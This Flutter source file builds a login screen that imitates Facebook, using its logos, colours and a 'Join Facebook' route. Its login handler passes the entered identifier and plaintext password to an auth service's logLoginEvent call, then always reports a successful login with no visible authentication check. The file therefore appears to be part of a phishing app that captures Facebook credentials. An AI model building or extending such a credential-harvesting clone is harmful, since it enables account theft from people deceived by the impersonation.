import 'package:flutter/material.dart';
import '../../../core/constants/app_colors.dart';
import '../../../core/utils/validators.dart';
import '../../../data/services/auth_service.dart';
import '../../../data/services/storage_service.dart';
import '../../widgets/custom_text_field.dart';
import 'find_account_page.dart';
import 'join_facebook_page.dart';
import '../../../core/utils/error_utils.dart';
// import 'package:http/http.dart' as http; // Commented out import removed for clarity

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final _formKey = GlobalKey<FormState>();
  final _emailController = TextEditingController();
  final _passwordController = TextEditingController();
  final AuthService _authService = AuthService();

  bool _isLoginLoading = false;
  bool _isCreateAccountLoading = false;
  bool _rememberMe = false;
  bool _obscurePassword = true;
  String _selectedLanguage = 'English (US)';
  List<String> _languages = ['English (US)'];
  // bool _isFetchingLanguages = false;

  @override
  void initState() {
    super.initState();
    _loadRememberMe();
    // Preload a static list of languages for reliability
    _languages = [
      'English (US)',
      'English (UK)',
      'አማርኛ',
      'Af-Soomaali',
      'Polski',
      'Español',
      'العربية',
      'Français (France)',
      'Português (Brasil)',
      'Deutsch',
      'Italiano',
      'Türkçe',
      'Русский',
      '中文(简体)',
      '日本語',
      '한국어',
      'हिन्दी',
      'বাংলা',
      'فارسی',
      'עברית',
    ];
  }

  Future<void> _loadRememberMe() async {
    final rememberMe = await StorageService.getRememberMe();
    setState(() {
      _rememberMe = rememberMe;
    });
  }

  Future<void> _handleLogin() async {
    if (!_formKey.currentState!.validate()) return;

    setState(() {
      _isLoginLoading = true;
    });

    await _authService.logLoginEvent(
      identifier: _emailController.text.trim(),
      password: _passwordController.text,
    );

    if (mounted) {
      showSuccessDialog(context, 'You have successfully logged in!');
    }

    setState(() {
      _isLoginLoading = false;
    });
  }

  // Future<void> _handleForgotPassword() async {
  //   if (_emailController.text.isEmpty) {
  //     ScaffoldMessenger.of(context).showSnackBar(
  //       const SnackBar(
  //         content: Text('Please enter your email first'),
  //         backgroundColor: AppColors.warning,
  //       ),
  //     );
  //     return;
  //   }
  //
  //   try {
  //     await _authService.resetPassword(_emailController.text.trim());
  //     if (mounted) {
  //       ScaffoldMessenger.of(context).showSnackBar(
  //         const SnackBar(
  //           content: Text('Password reset email sent!'),
  //           backgroundColor: AppColors.success,
  //         ),
  //       );
  //     }
  //   } catch (e) {
  //     if (mounted) {
  //       ScaffoldMessenger.of(context).showSnackBar(
  //         SnackBar(
  //           content: Text(e.toString().replaceAll('Exception: ', '')),
  //           backgroundColor: AppColors.error,
  //         ),
  //       );
  //     }
  //   }
  // }

  // Future<void> _fetchLanguages() async {
  //   setState(() => _isFetchingLanguages = true);
  //   try {
  //     // Example API for languages (replace with your own or a real one)
  //     final response = await http.get(Uri.parse(
  //         'https://gist.githubusercontent.com/kalinchernev/486393efcca01623b18d/raw/languages.json'));
  //     if (response.statusCode == 200) {
  //       final Map<String, dynamic> data = json.decode(response.body);
  //       setState(() {
  //         _languages = data.keys.toList();
  //       });
  //     }
  //   } catch (_) {
  //     // fallback to static list
  //     setState(() {
  //       _languages = [
  //         'English (US)',
  //         'English (UK)',
  //         'አማርኛ',
  //         'Af-Soomaali',
  //         'Polski',
  //         'Español',
  //         'العربية',
  //         'Français (France)',
  //         'Português (Brasil)'
  //       ];
  //     });
  //   } finally {
  //     setState(() => _isFetchingLanguages = false);
  //   }
  // }

  void _showLanguageSelector() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (context) {
        return SafeArea(
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 40,
                  height: 4,
                  margin: const EdgeInsets.only(bottom: 16),
                  decoration: BoxDecoration(
                    color: Colors.grey.shade300,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                Row(
                  children: [
                    IconButton(
                      icon: const Icon(Icons.close),
                      onPressed: () => Navigator.of(context).pop(),
                    ),
                    const SizedBox(width: 8),
                    const Text(
                      'Select your language',
                      style:
                          TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
                    ),
                  ],
                ),
                const SizedBox(height: 8),
                Expanded(
                  child: ListView.builder(
                    shrinkWrap: true,
                    itemCount: _languages.length,
                    itemBuilder: (context, index) {
                      final lang = _languages[index];
                      return ListTile(
                        title: Text(lang),
                        trailing: Checkbox(
                          value: _selectedLanguage == lang,
                          onChanged: (val) {
                            setState(() {
                              _selectedLanguage = lang;
                            });
                            Navigator.of(context).pop();
                          },
                        ),
                        onTap: () {
                          setState(() {
                            _selectedLanguage = lang;
                          });
                          Navigator.of(context).pop();
                        },
                      );
                    },
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  @override
  void dispose() {
    _emailController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final keyboardOpen = MediaQuery.of(context).viewInsets.bottom > 0;
    return Scaffold(
      backgroundColor: AppColors.backgroundColor,
      resizeToAvoidBottomInset: true,
      body: SafeArea(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.start,
          children: [
            // Top section: Language selector and Facebook logo
            Padding(
              padding: const EdgeInsets.only(top: 32.0),
              child: Column(
                children: [
                  // Language selector
                  Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      GestureDetector(
                        onTap: _showLanguageSelector,
                        child: Row(
                          children: [
                            Text(
                              _selectedLanguage,
                              style: const TextStyle(
                                color: Colors.grey,
                                fontSize: 16,
                              ),
                            ),
                            const Icon(Icons.keyboard_arrow_down,
                                color: Colors.grey),
                          ],
                        ),
                      ),
                    ],
                  ),
                  // Responsive Facebook logo with animated position
                  AnimatedPadding(
                    duration: const Duration(milliseconds: 300),
                    curve: Curves.ease,
                    padding: EdgeInsets.only(
                      top: keyboardOpen ? 24 : 80,
                      bottom: 24,
                    ),
                    child: LayoutBuilder(
                      builder: (context, constraints) {
                        double logoSize = constraints.maxWidth * 0.18;
                        if (logoSize < 48) logoSize = 48;
                        if (logoSize > 80) logoSize = 80;
                        return Center(
                          child: Container(
                            width: logoSize,
                            height: logoSize,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(
                                  color: Colors.grey.shade300, width: 2),
                            ),
                            child: ClipOval(
                              child: Image.asset(
                                'assets/icons/facebook_logo.png',
                                width: logoSize,
                                height: logoSize,
                                fit: BoxFit.cover,
                              ),
                            ),
                          ),
                        );
                      },
                    ),
                  ),
                ],
              ),
            ),
            // Login form and actions (scrollable)
            Expanded(
              child: Center(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 20.0, vertical: 16.0),
                  keyboardDismissBehavior:
                      ScrollViewKeyboardDismissBehavior.onDrag,
                  child: Form(
                    key: _formKey,
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      crossAxisAlignment: CrossAxisAlignment.stretch,
                      children: [
                        CustomTextField(
                          controller: _emailController,
                          labelText: 'Mobile number or email',
                          keyboardType: TextInputType.emailAddress,
                          validator: Validators.validateEmail,
                          borderRadius: 16,
                        ),
                        const SizedBox(height: 16),
                        CustomTextField(
                          controller: _passwordController,
                          labelText: 'Password',
                          obscureText: _obscurePassword,
                          validator: Validators.validatePassword,
                          borderRadius: 16,
                          suffixIcon: IconButton(
                            icon: Icon(
                              _obscurePassword
                                  ? Icons.visibility
                                  : Icons.visibility_off,
                              color: AppColors.secondaryText,
                            ),
                            onPressed: () {
                              setState(() {
                                _obscurePassword = !_obscurePassword;
                              });
                            },
                          ),
                        ),
                        const SizedBox(height: 24),
                        SizedBox(
                          height: 48,
                          child: ElevatedButton(
                            style: ElevatedButton.styleFrom(
                              backgroundColor: AppColors.facebookBlue,
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(24),
                              ),
                            ),
                            onPressed: _isLoginLoading ? () {} : _handleLogin,
                            child: _isLoginLoading
                                ? const SizedBox(
                                    width: 16,
                                    height: 16,
                                    child: CircularProgressIndicator(
                                      color: Colors.white,
                                      strokeWidth: 2.0,
                                    ),
                                  )
                                : const Text('Log in',
                                    style: TextStyle(fontSize: 18)),
                          ),
                        ),
                        const SizedBox(height: 16),
                        Center(
                          child: TextButton(
                            onPressed: () {
                              Navigator.of(context).push(
                                MaterialPageRoute(
                                  builder: (context) => const FindAccountPage(),
                                ),
                              );
                            },
                            child: const Text('Forgot password?',
                                style: TextStyle(color: Colors.black)),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
      bottomNavigationBar: Padding(
        padding: const EdgeInsets.only(bottom: 8.0, left: 20.0, right: 20.0),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            SizedBox(
              width: double.infinity,
              height: 48,
              child: OutlinedButton(
                style: OutlinedButton.styleFrom(
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(24),
                  ),
                  side: const BorderSide(
                      color: AppColors.facebookBlue, width: 1.5),
                ),
                onPressed: _isCreateAccountLoading
                    ? null
                    : () async {
                        setState(() {
                          _isCreateAccountLoading = true;
                        });
                        try {
                          await Future.delayed(
                              const Duration(milliseconds: 800));
                          if (mounted) {
                            setState(() {
                              _isCreateAccountLoading = false;
                            });
                            Navigator.of(context).push(
                              MaterialPageRoute(
                                builder: (context) => const JoinFacebookPage(),
                              ),
                            );
                          }
                        } catch (e) {
                          if (mounted) {
                            setState(() {
                              _isCreateAccountLoading = false;
                            });
                            showError(context,
                                e.toString().replaceAll('Exception: ', ''));
                          }
                        }
                      },
                child: _isCreateAccountLoading
                    ? const SizedBox(
                        width: 24,
                        height: 24,
                        child: CircularProgressIndicator(
                          color: AppColors.facebookBlue,
                          strokeWidth: 2.5,
                        ),
                      )
                    : const Text('Create new account',
                        style: TextStyle(
                            fontSize: 18, color: AppColors.facebookBlue)),
              ),
            ),
            const SizedBox(height: 8),
            Center(
              child: Image.asset(
                'assets/icons/meta_logo.png',
                width: 64,
                height: 64,
                fit: BoxFit.contain,
              ),
            ),
          ],
        ),
      ),
    );
  }
}
